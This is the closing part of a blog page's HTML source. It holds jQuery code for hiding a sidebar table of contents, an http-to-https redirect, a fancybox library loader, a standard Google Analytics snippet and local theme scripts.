    $('.post-toc-wrap').animate({"width": 0}, function(){
        $('.post-toc-wrap').hide();
    });
    $('body').animate({"margin-right": 0});
    $('.left-post').addClass('pure-u-md-3-4');
    $('.body_container').animate({"padding-right": "60px"}, function() {
        $('.body_container').css('padding-right', '');
        $(window).resize();
    });
    $('.right-widgets').show();
    $('#right-toggle').removeClass('close');
    $('#right-toggle').addClass('open');
}</script></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.3" async></script><script>(function (root) {
  "use strict";
  var h = root ? root.location.hostname : "",
  p = root ? root.location.protocol : "";
  if ("http:" === p && !(/^(localhost|127.0.0.1)/).test(h)) {
    root.location.protocol = "https:";
  }
})("undefined" !== typeof window ? window : this);
</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.3" async></script><link rel="stylesheet" type="text/css" href="/css/jquery.fancybox.css?v=0.0.3"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create','UA-69760423-1','auto');ga('send','pageview');
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.3"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.3"></script><script type="text/javascript" src="/js/app.js?v=0.0.3"></script><script type="text/javascript" src="/js/background-canvas.js?v=0.0.3"></script></div></body></html>